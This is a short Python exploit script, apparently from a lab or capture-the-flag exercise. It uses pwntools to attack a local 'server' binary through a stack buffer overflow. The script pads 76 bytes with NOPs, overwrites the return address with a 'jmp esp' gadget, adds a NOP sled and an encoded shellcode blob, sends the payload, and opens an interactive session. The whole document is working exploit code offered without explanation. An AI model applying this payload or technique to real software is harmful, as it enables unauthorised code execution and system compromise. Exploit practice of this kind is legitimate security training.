from pwn import *

# set up file and context
exe = '/home/kali/Desktop/server'
elf = ELF(exe, checksec = 0)
# context.binary = elf

io = elf.process()

# set up payload
offset = 76 
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))
# jmp_esp = ROP(elf).find_gadget(['jmp esp'])
buf = b""
buf += b"\xb8\xa4\xe4\x0d\x3b\xda\xd2\xd9\x74\x24\xf4\x5b\x31"        
buf += b"\xc9\xb1\x12\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x46"        
buf += b"\x11\xe6\x0d\x3e\xdf\xf9\x71\x3e\xbb\xc8\xb8\xf3\xbb"        
buf += b"\xa2\xf8\xb3\xbf\xb4\xfe\xc3\x36\x53\x77\x3a\xf2\x9c"        
buf += b"\x98\xbc\x03\x50\x18\x35\xc1\xd2\x1d\x45\xc6\x22\xa5"        
buf += b"\x47\xc6\x22\xd9\x8a\x46\x9a\xd8\x14\x47\xdb\x61\x14"        
buf += b"\x47\xdb\x95\xd9\xc7\x33\x50\x1e\x38\x3c\x3d\x8c\xa6"        
buf += b"\xa4\xec\x38\x51\x5f\xf1"

payload = flat(
    asm('nop') * offset,     # offset
    jmp_esp,                 # jmp esp 
    asm('nop') * 16,         # sled 
    buf                      # shellcode
)
# print(jmp_esp)
# for i in dir(ROP(elf).find_gadget): print(i)
io.sendlineafter(b':', payload)
# io.wait()
io.interactive()